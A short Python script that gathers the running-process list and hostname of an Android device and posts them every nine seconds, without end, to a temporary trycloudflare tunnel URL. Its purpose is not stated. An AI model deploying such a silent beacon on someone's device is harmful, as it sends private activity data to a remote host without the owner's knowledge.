import androidprocess
import requests
import socket
import time
SERVER = "https://maintained-corpus-happiness-becomes.trycloudflare.com"
def collect():
    processes = androidprocess.inspect_processes()
    return {
        "device": socket.gethostname(),
        "os": "android",
        "processes": processes
    }
while True:
    try:
        requests.post(f"{SERVER}/push/android", json=collect())
        print("Data pushed successfully!")
    except Exception as e:
        print("Error:", e)
    time.sleep(9)
